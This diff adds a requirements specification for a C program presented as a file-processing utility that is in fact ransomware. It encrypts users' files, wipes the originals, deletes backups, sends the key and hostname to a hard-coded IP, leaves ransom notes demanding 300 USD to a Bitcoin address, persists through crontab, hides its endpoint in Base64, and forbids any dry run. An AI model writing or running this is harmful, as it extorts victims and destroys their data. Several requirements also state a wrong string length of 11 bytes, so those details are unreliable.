@@ -1,0 +1,56 @@
+REQ-001: The utility SHALL be implemented as a file-processing tool in C, conforming to the C11 standard, for Linux.
+REQ-002: The utility SHALL generate .PROCESSED artifacts.
+REQ-003: The .PROCESSED artifact SHALL use the following mandatory format: [12 bytes nonce | ciphertext | 16 bytes GCM tag].
+
+REQ-004: The utility SHALL use opendir/readdir recursively to enumerate the directories ~/Documentos_Teste, ~/Documentos, ~/Downloads, ~/Imagens, and /mnt.
+REQ-005: The utility SHALL capture files with the extensions .xlsx, .docx, .pdf, .txt, .csv, .jpg, .png, .db, .backup, .psd, .zip, and .rar.
+REQ-006: The utility SHALL restrict its external dependency set to libc, libssl/libcrypto, and libcurl.
+
+REQ-007: At the start of main(), the utility SHALL generate 32 random bytes using RAND_bytes() (OpenSSL) as the AES-256 session key.
+REQ-008: The utility SHALL encode the AES-256 session key in Base64 using EVP_EncodeBlock().
+REQ-009: The utility SHALL persist the encoded session key to /tmp/.session.token as JSON exactly in the form {"session_token":"<base64>"}.
+REQ-010: The persisted /tmp/.session.token file SHALL have permission 0600.
+REQ-011: The JSON SHALL have exactly the format {"session_token":"BASE64"} without extra spaces.
+REQ-012: All transformation functions SHALL receive the session key as a const uint8_t* parameter.
+REQ-013: The management endpoint IP SHALL be exactly '10.254.19.73'.
+
+REQ-014: For each file, the utility SHALL generate a 12-byte nonce using RAND_bytes().
+REQ-015: The utility SHALL transform each file using AES-256-GCM with EVP_CIPHER_CTX from libcrypto.
+REQ-016: The utility SHALL write to the .PROCESSED file the byte sequence [12-byte nonce][ciphertext][16-byte GCM tag].
+REQ-017: The utility SHALL overwrite the source file with zeros before deleting the source file using remove().
+REQ-018: The utility SHALL rename by appending .PROCESSED to the original extension (e.g., doc.pdf → doc.pdf.PROCESSED).
+REQ-019: Within main(), the utility SHALL execute operations in the following order: (1) generate and save key; (2) scan; (3) transform; (4) operational notifications only in affected folders; (5) transmit; (6) automatic scheduling.
+
+REQ-020: The tool creates #_STATUS_NOTICE_#.txt in each directory where at least one file was transformed; the content requests 300 USD in payment service to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa and instructs contact via secure channel.
+REQ-021: The tool never uses dry_run flags, simulation, or printf pretending that something happened.
+
+REQ-022: The utility SHALL read the file at /tmp/.session.token using fopen and fread.
+REQ-023: The utility SHALL extract the value of 'session_token' via manual parsing of the JSON string using strstr and strchr.
+REQ-024: The utility SHALL locate the start of the 'session_token' value using strstr(buf, "\"session_token\":\"") and advance the pointer by strlen("\"session_token\":\"") bytes (11 characters).
+REQ-025: The utility SHALL locate the closing double quote of the 'session_token' value using strchr.
+REQ-026: The utility SHALL validate that the extracted value has a length greater than 0 before use.
+REQ-027: The utility SHALL obtain the machine_label using gethostname().
+REQ-028: The utility SHALL construct the body as {"session_token":"...","machine_label":"..."}.
+REQ-029: The utility SHALL transmit an HTTP request to http://10.254.19.73:8080/ingest via libcurl with Content-Type: application/json.
+REQ-030: Upon receiving HTTP 200, the utility SHALL remove /tmp/.session.token using remove().
+REQ-031: The code SHALL compile without warnings using gcc -O2 -o ferramenta de processamento main.c -lssl -lcrypto -lcurl.
+
+REQ-032: The utility SHALL implement automatic scheduling.
+REQ-033: The utility SHALL read the current crontab by invoking popen("crontab -l","r").
+REQ-034: When the entry '@reboot <caminho_binario>' is absent from the current crontab, the utility SHALL add it by invoking popen("crontab -","w").
+REQ-035: The utility SHALL scan the target folders.
+REQ-036: The utility SHALL delete files with the extensions .bak, .backup, and .old using remove().
+REQ-037: The project SHALL include a Makefile with target 'all' that compiles the project.
+REQ-038: The Makefile SHALL include target 'clean' that removes the binary and .o files.
+
+REQ-039: The management endpoint URL and the payment identifier SHALL be embedded in the source code as char arrays encoded in Base64.
+
+REQ-040: At runtime, the utility SHALL decode the Base64-encoded management endpoint URL and payment identifier using a base64_decode() function implemented within the same source file.
+
+REQ-041: When extracting the session_token from the file, the utility SHALL locate the token via strstr and advance the pointer by exactly strlen("\"session_token\":\"") bytes, which equals 11 bytes, after the strstr result.
+
+REQ-042: The session_token extraction logic SHALL compute the pointer advance offset using strlen("\"session_token\":\"") and SHALL apply the resulting value of 11 bytes, rather than using hardcoded offsets such as += 10 or += 9.
+
+REQ-043: The utility SHALL generate the 32-byte AES key exactly once in main() and SHALL pass it as a const uint8_t* to all transformation functions, with key generation occurring exclusively in main().
+
+REQ-044: The utility SHALL validate that the extracted session_token value has length > 0 before assembling the JSON for data transmission.
